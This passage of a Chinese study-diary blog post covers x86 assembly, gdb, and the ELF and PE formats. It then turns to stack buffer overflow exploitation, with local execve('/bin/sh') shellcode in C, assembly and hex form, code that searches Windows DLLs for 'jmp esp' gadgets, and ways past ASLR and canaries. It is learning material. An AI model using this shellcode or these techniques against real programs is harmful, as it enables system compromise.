语法没有相应的东西要加</td>\n</tr>\n</tbody></table>\n<p><strong>gdb</strong></p>\n<p><strong>gdb指令（短/长）</strong></p>\n<ul>\n<li><p>r/run, c/continue</p>\n</li>\n<li><p>s/step, n/next</p>\n</li>\n<li><p>si, ni</p>\n</li>\n<li><p>b/break</p>\n</li>\n<li><p>bt/backtrace</p>\n</li>\n<li><p>x, print, display,     info</p>\n</li>\n<li><p>…</p>\n</li>\n<li><p>Breakpoints: stops     when executed </p>\n</li>\n<li><ul>\n<li>break function</li>\n<li>break *addr</li>\n<li>info break</li>\n<li>clear function</li>\n<li>delete/enable/disable      [n]</li>\n</ul>\n</li>\n<li><p>Watchpoints: stops     when values changed </p>\n</li>\n<li><ul>\n<li>watch expr</li>\n<li>info watch</li>\n</ul>\n</li>\n<li><p>continue</p>\n</li>\n<li><p>step：     向前移动一步（语句），在调用函数时进入被调用者</p>\n</li>\n<li><p>stepi：    向前移动一步（指令），在调用函数时进入被调用者</p>\n</li>\n<li><p>next：     向前移动一步（语句），在调用函数时跳过被调用者</p>\n</li>\n<li><p>nexti：    向前移动一步（指令），在调用函数时跳过被调用者</p>\n</li>\n<li><p>print [/f] expr</p>\n</li>\n<li><ol>\n<li>x      十六进制</li>\n<li>d      有符号十进制</li>\n<li>u      无符号十进制</li>\n<li>o      八进制</li>\n<li>t       二进制</li>\n<li>a      地址</li>\n<li>c      character</li>\n<li>f       浮点数</li>\n</ol>\n</li>\n<li><p>info reg [rn]</p>\n</li>\n<li><p>Display </p>\n</li>\n<li><ul>\n<li><p>x [/Nuf] expr </p>\n</li>\n<li><ul>\n<li><p>N count of units       to display</p>\n</li>\n<li><p>u unit size </p>\n</li>\n<li><ul>\n<li>b 字节</li>\n<li>h 双字</li>\n<li>w 四字</li>\n<li>g 八字节</li>\n</ul>\n</li>\n<li><p>f printing format       </p>\n</li>\n<li><ul>\n<li>s 空字符结束的字符串</li>\n<li>i 汇编指令</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>disassem [addr]</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>链接过程</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161620552.png\" alt=\"image-20210625161620552\" style=\"zoom:20%;\" />\n\n<p><strong>文件格式</strong></p>\n<ul>\n<li><p>文件类型识别 </p>\n</li>\n<li><ul>\n<li>file命令</li>\n<li>文件magic</li>\n<li>binwalk项目，参考ReFirmLabs/binwalk</li>\n</ul>\n</li>\n<li><p>文件检查 </p>\n</li>\n<li><ul>\n<li>md5sum，校验文件md5值</li>\n<li>virustotal,识别恶意代码</li>\n<li>fuzzy hashing: ssdeep fuzzywuzzy</li>\n<li>diff/patch</li>\n</ul>\n</li>\n<li><p>ELF/PE/Mach-O </p>\n</li>\n<li><ul>\n<li>readelf命令</li>\n<li>peview/loard-pe/等</li>\n</ul>\n</li>\n</ul>\n<p><strong>ELF文件格式</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161817046.png\" alt=\"image-20210625161817046\" style=\"zoom: 33%;\" />\n\n<p><strong>PE文件格式</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161921562.png\" alt=\"image-20210625161921562\" style=\"zoom:33%;\" />\n\n<p><strong>如何利用缓冲区溢出</strong></p>\n<ul>\n<li><p>覆盖局部变量 </p>\n</li>\n<li><ul>\n<li>尤其是函数指针</li>\n</ul>\n</li>\n<li><p>覆盖错误句柄</p>\n</li>\n<li><p>覆盖存储在栈帧上的指针</p>\n</li>\n<li><p>覆盖返回地址 </p>\n</li>\n<li><ul>\n<li>当函数返回时改变EIP</li>\n</ul>\n</li>\n</ul>\n<p><strong>shellcode开发</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *name[<span class=\"number\">2</span>];</span><br><span class=\"line\">    name[<span class=\"number\">0</span>] = <span class=\"string\">&quot;/bin/sh&quot;</span>;</span><br><span class=\"line\">    name[<span class=\"number\">1</span>] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    execve(name[<span class=\"number\">0</span>],name,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>如何利用缓冲区溢出</strong></p>\n<p>把指令和数据改为字符串形式</p>\n<p>“\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x46<br> \\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c<br> xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\x<br> ff\\xff\\xff/bin/sh”</p>\n<p><strong>shellcode开发</strong></p>\n<p>编写汇编程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">section .text</span><br><span class=\"line\">global _start</span><br><span class=\"line\">_start:</span><br><span class=\"line\">xor eax,eax</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push 0x68732f2f</span><br><span class=\"line\">push 0x6e69622f</span><br><span class=\"line\">mov ebx,esp</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push ebx</span><br><span class=\"line\">mov ecx,esp</span><br><span class=\"line\">xor edx,edx</span><br><span class=\"line\">mov al,0xb</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n\n<p>编译并获取机器码</p>\n<p>char shellcode[]=”\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80”;</p>\n<ul>\n<li><p>不是所有的字符都能作为shellcode     </p>\n</li>\n<li><ul>\n<li>gets():遇到换行符就停止</li>\n<li>strcpy():遇到NULL就停止</li>\n<li>…</li>\n</ul>\n</li>\n<li><p>shellcode需要做相应的调整 </p>\n</li>\n<li><ul>\n<li>删除 \\x00,空格，换行符…</li>\n<li>删除不能被打印的字符</li>\n</ul>\n</li>\n</ul>\n<p><strong>基础栈溢出</strong></p>\n<ul>\n<li><p>覆盖返回地址，shellcode位与栈上     </p>\n</li>\n<li><ul>\n<li>问题：攻击者如何精确定位shellcode的地址</li>\n<li>解决：NOP slide</li>\n</ul>\n</li>\n<li><p>猜测大概的栈地址</p>\n</li>\n<li><p>在shellcode前面填充大量NOPs</p>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164034717.png\" alt=\"image-20210625164034717\" style=\"zoom:35%;\" />\n\n<ul>\n<li><p>覆盖返回地址，shellcode位与栈上     </p>\n</li>\n<li><ul>\n<li>问题：如果buffer长度小于shellcode长度</li>\n<li>解决：RNS模式</li>\n</ul>\n</li>\n<li><p>把shellcode放在内存的高位上（调用者的栈帧）</p>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164102489.png\" alt=\"image-20210625164102489\" style=\"zoom:33%;\" />\n\n<p><strong>关于字符串的危险库函数</strong></p>\n<ul>\n<li>strcpy (char *dest,     const char *src)</li>\n<li>strcat (char *dest,     const char *src)</li>\n<li>gets (char *s)</li>\n<li>scanf ( const char     *format, … )</li>\n<li>…</li>\n</ul>\n<p><strong>基础栈溢出的问题</strong></p>\n<ul>\n<li>依赖缓冲区/栈的地址，栈的地址会根据平台和每次运行而改变。</li>\n<li>如何构造一个适用于大多数平台的攻击？</li>\n</ul>\n<p><strong>jmp esp</strong></p>\n<ul>\n<li>寻找指令”jmp     esp”的地址</li>\n<li>不需要知道shellcode的地址</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164339018.png\" alt=\"image-20210625164339018\" style=\"zoom:33%;\" />\n\n<p><strong>到哪里寻找 “jmp esp”</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span>,<span class=\"keyword\">char</span>**,<span class=\"keyword\">char</span>**)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tBYTE* pbyte;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> nPos=<span class=\"number\">0</span>,nAddr=<span class=\"number\">0</span>;</span><br><span class=\"line\">\tHINSTANCE hHinst=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> bTips=<span class=\"literal\">true</span>;</span><br><span class=\"line\">\thHinst=LoadLibrary(<span class=\"string\">&quot;user32.dll&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!hHinst) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\tpbyte=(BYTE*)hHinst;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(bTips)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(pbyte[nPos]==<span class=\"number\">0xff</span> &amp;&amp; pbyte[nPos+<span class=\"number\">1</span>]==<span class=\"number\">0xe4</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tnAddr=(<span class=\"keyword\">int</span>)pbyte+nPos;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;address is 0x%x\\n&quot;</span>,nAddr);</span><br><span class=\"line\">\t\t\tbTips=<span class=\"literal\">false</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         <span class=\"keyword\">else</span></span><br><span class=\"line\">           nPos++;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">if</span>(hHinst!=<span class=\"literal\">NULL</span>) FreeLibrary(hHinst);</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;tchar.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">int</span> nRetCode=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> we_load_it=<span class=\"literal\">false</span>;</span><br><span class=\"line\">HINSTANCE h;</span><br><span class=\"line\">TCHAR dllname[]=_T(<span class=\"string\">&quot;ntdll&quot;</span>);       </span><br><span class=\"line\">h=<span class=\"built_in\">GetModuleHandle</span>(dllname);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(h==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;h=<span class=\"built_in\">LoadLibrary</span>(dllname);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(h==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\"> &#123;cout&lt;&lt;<span class=\"string\">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;dllname&lt;&lt;endl;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">we_load_it=<span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BYTE* ptr=(BYTE*)h;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> done=<span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> y=<span class=\"number\">0</span>;!done;y++)</span><br><span class=\"line\">&#123;<span class=\"keyword\">try</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(ptr[y]==<span class=\"number\">0xFF</span>&amp;&amp;ptr[y+<span class=\"number\">1</span>]==<span class=\"number\">0xE4</span>)</span><br><span class=\"line\">&#123;<span class=\"keyword\">int</span> pos=(<span class=\"keyword\">int</span>)ptr+y;</span><br><span class=\"line\">cout&lt;&lt;<span class=\"string\">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;endl;&#125;&#125;</span><br><span class=\"line\"><span class=\"built_in\"><span class=\"keyword\">catch</span></span>(...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">cout&lt;&lt;<span class=\"string\">&quot;END OF&quot;</span>&lt;&lt;dllname&lt;&lt;<span class=\"string\">&quot;MEMORY REACHED&quot;</span>&lt;&lt;endl;</span><br><span class=\"line\">done=<span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(we_load_it)</span><br><span class=\"line\"><span class=\"built_in\">FreeLibrary</span>(h);</span><br><span class=\"line\"><span class=\"keyword\">return</span> nRetCode;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;tchar.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">int</span> nRetCode=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> we_load_it=<span class=\"literal\">false</span>;</span><br><span class=\"line\">HINSTANCE h;</span><br><span class=\"line\">TCHAR dllname[]=_T(<span class=\"string\">&quot;ntdll&quot;</span>);       </span><br><span class=\"line\">h=<span class=\"built_in\">GetModuleHandle</span>(dllname);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(h==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;h=<span class=\"built_in\">LoadLibrary</span>(dllname);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(h==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\"> &#123;cout&lt;&lt;<span class=\"string\">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;dllname&lt;&lt;endl;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">we_load_it=<span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BYTE* ptr=(BYTE*)h;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> done=<span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> y=<span class=\"number\">0</span>;!done;y++)</span><br><span class=\"line\">&#123;<span class=\"keyword\">try</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(ptr[y]==<span class=\"number\">0xFF</span>&amp;&amp;ptr[y+<span class=\"number\">1</span>]==<span class=\"number\">0xE4</span>)</span><br><span class=\"line\">&#123;<span class=\"keyword\">int</span> pos=(<span class=\"keyword\">int</span>)ptr+y;</span><br><span class=\"line\">cout&lt;&lt;<span class=\"string\">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;endl;&#125;&#125;</span><br><span class=\"line\"><span class=\"built_in\"><span class=\"keyword\">catch</span></span>(...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">cout&lt;&lt;<span class=\"string\">&quot;END OF&quot;</span>&lt;&lt;dllname&lt;&lt;<span class=\"string\">&quot;MEMORY REACHED&quot;</span>&lt;&lt;endl;</span><br><span class=\"line\">done=<span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(we_load_it)</span><br><span class=\"line\"><span class=\"built_in\">FreeLibrary</span>(h);</span><br><span class=\"line\"><span class=\"keyword\">return</span> nRetCode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不知道哪个能用&gt;(●’◡’●)&lt;</p>\n<p><strong>ASLR和PIE</strong></p>\n<p>地址址空间配置随机化（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）它是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。</p>\n<ul>\n<li>程序每次执行的地址和libc的地址都会随机变化</li>\n<li>使用固定地址的”jmp esp== ‘\\xff\\xe4’ “攻击失效</li>\n</ul>\n<p><strong>应对手段</strong></p>\n<p><strong>泄漏libc基地址</strong></p>\n<p>即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。</p>\n<p><strong>stack cookies</strong></p>\n<p>Canary</p>\n<p>在缓冲区和返回地址之间插入一个cookie，函数返回时会检查其是否被修改，如果与插入时的值不一致，则认为发生了缓冲区溢出。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625170722345.png\" alt=\"image-20210625170722345\" style=\"zoom:33%;\" />\n\n<ul>\n<li><p>绕过手段 </p>\n</li>\n<li><ul>\n<li>通过信息泄漏漏洞获取cookie</li>\n<li>使用不会覆盖cookie的漏洞</li>\n<li>覆盖其他敏感数据而不是返回地址</li>\n</ul>\n</li>\n</ul>\n<p><strong>影子栈-StackShield</strong></p>\n<ul>\n<li>把正确的返回地址保存在一个攻击者难以接触的地方</li>\n<li>函数返回时把当前返回地址和保存的返回地址比较</li>\n</ul>\n<p>在函数开始是保存RET，在函数返回时比较。</p>\n<ul>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>返回地址难以覆盖</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>高性能开销</li>\n<li>保存的返回地址需要被保护</li>\n<li>兼容性问题</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习日记1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"汇编基础（x86）\"><a href=\"#汇编基础（x86）\" class=\"headerlink\" title=\"汇编基础（x86）\"></a>汇编基础（x86）</h3><ul>\n<li><p>内存</p>\n</li>\n<li><p>寄存器： </p>\n</li>\n<li><ol>\n<li>普通: EAX, EBX, ECX, EDX<pre><code>        ESI, EDI, EBP, ESP\n</code></pre>\n</li>\n<li>段寄存器:      CS, DS, ES, FS, GS, SS</li>\n<li>特殊寄存器:      EIP, EFLAGS</li>\n</ol>\n</li>\n<li><p>指令: </p>\n</li>\n<li><ol>\n<li>push,pop</li>\n<li>add/sub/mul/div,      xor, or</li>\n<li>mov,      lea,</li>\n<li>test,      cmp, jmp, call, ret</li>\n</ol>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155650349.png\" style=\"zoom:25%;\" />\n\n<h3 id=\"栈上的数据\"><a href=\"#栈上的数据\" class=\"headerlink\" title=\"栈上的数据\"></a>栈上的数据</h3><p>EIP存储的是下一条要执行的指令的地址，所以若EIP的值被修改为我们期望的地址，函数运行到ret时，程序将会跳到修改后的地址运行指令。根据上面来看，在进入函数时，通常栈上的数据是这样的。可以看出，ESP永远指向栈顶的位置，而EBP则永远指向当前函数空间的栈底。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155751637.png\" style=\"zoom:40%;\" />\n\n<p><strong>IA32寄存器</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155828057.png\" style=\"zoom:25%;\" />\n\n<p><strong>x86-64寄存器</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155850731.png\" style=\"zoom:25%;\" />\n\n<p><strong>关键寄存器</strong></p>\n<ul>\n<li><p>EIP： </p>\n</li>\n<li><ul>\n<li>指向下一条要被执行的指令，cpu将从eip指向的地址获取指令</li>\n<li>不能被直接覆写</li>\n</ul>\n</li>\n<li><p>ESP： </p>\n</li>\n<li><ul>\n<li>指向栈顶</li>\n<li>PUSH/POP操作都基于操作ESP</li>\n</ul>\n</li>\n</ul>\n<p><strong>基本指令</strong></p>\n<ul>\n<li><p>操作栈 </p>\n</li>\n<li><ul>\n<li>push</li>\n<li>pop</li>\n</ul>\n</li>\n<li><p>运算操作 </p>\n</li>\n<li><ul>\n<li>add/sub/mul/div</li>\n<li>xor/or</li>\n</ul>\n</li>\n<li><p>内存/寄存器操作 </p>\n</li>\n<li><ul>\n<li>mov/lea</li>\n</ul>\n</li>\n<li><p>条件执行 </p>\n</li>\n<li><ul>\n<li>test，cmp，jmp</li>\n<li>jz，jnz，jg，ja</li>\n</ul>\n</li>\n<li><p>子程序调用 </p>\n</li>\n<li><ul>\n<li>call，ret</li>\n</ul>\n</li>\n</ul>\n<p><strong>重要指令</strong></p>\n<ul>\n<li><p>call     <function>:执行目标函数</p>\n</li>\n<li><ul>\n<li>把下一条指令（返回地址）压栈</li>\n<li>跳转到目标函数</li>\n<li>应该在函数调用完之后执行下一条指令</li>\n</ul>\n</li>\n<li><p>ret：返回调用</p>\n</li>\n<li><ul>\n<li>弹出（pop）栈顶，得到返回地址</li>\n<li>跳转到跳转到返回地址（通过改变EIP）</li>\n<li>应该跳转到调用方的下一条指令</li>\n</ul>\n</li>\n</ul>\n<p><strong>函数调用时发生了什么</strong>(x86)</p>\n<ol>\n<li>传递参数</li>\n<li>call     函数地址（push eip，jmp 被调函数地址）</li>\n<li>ebp入栈，当前esp复制到ebp，esp减去一个数值，形成该函数的栈空间</li>\n<li>初始化局部变量（自动变量）</li>\n<li>运行函数指令</li>\n<li>返回值传递</li>\n<li>pop ebp</li>\n<li>ret（pop     eip）</li>\n</ol>\n<p>这里没有提到平衡栈帧的操作，实际上根据调用约定的不同，这个操作会在调用者或被调用者两个地方进行。</p>\n<p><strong>Intel 和 AT&amp;T语法</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>Intel Syntax</strong></th>\n<th><strong>AT&amp;T Syntax</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mov  eax,1</td>\n<td>movl $1,  %eax</td>\n</tr>\n<tr>\n<td>mov ebx,  0ffh</td>\n<td>movl  $0xff, %ebx</td>\n</tr>\n<tr>\n<td>int 80h</td>\n<td>int  $0x80</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum: </span><br><span class=\"line\">    push ebp</span><br><span class=\"line\">    mov ebp, esp</span><br><span class=\"line\">    mov eax, [ebp+12]</span><br><span class=\"line\">    add eax, [ebp+8]</span><br><span class=\"line\">    pop ebp</span><br><span class=\"line\">    retn</span><br><span class=\"line\">sum:</span><br><span class=\"line\">    pushl %ebp</span><br><span class=\"line\">    movl %esp,%ebp</span><br><span class=\"line\">    movl 12(%ebp),%eax</span><br><span class=\"line\">    addl 8(%ebp),%eax</span><br><span class=\"line\">    popl %ebp</span><br><span class=\"line\">    ret</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th><strong>Intel Syntax</strong></th>\n<th><strong>AT&amp;T Syntax</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>AT&amp;T 语法先写源操作数，再写目标操作数</td>\n<td>Intel  语法先写目标操作数，再写源操作数：</td>\n</tr>\n<tr>\n<td>AT&amp;T 语法将操作数的大小表示在指令的后缀中（b、w、l）</td>\n<td>Intel  语法将操作数的大小表示在操作数的前缀中（BYTE PTR、WORD PTR、DWORD PTR）</td>\n</tr>\n<tr>\n<td>AT&amp;T 语法总体上是offset(base, index, width)的格式</td>\n<td>Intel  语法总体上是[INDEX * WIDTH + BASE + OFFSET]的格式</td>\n</tr>\n<tr>\n<td>AT&amp;T 语法用前缀表示数制（0x、0、0b）</td>\n<td>Intel  语法用后缀表示数制（h、o、b）</td>\n</tr>\n<tr>\n<td>AT&amp;T 语法要在常数前加 $、在寄存器名前加 % 符号</td>\n<td>Intel  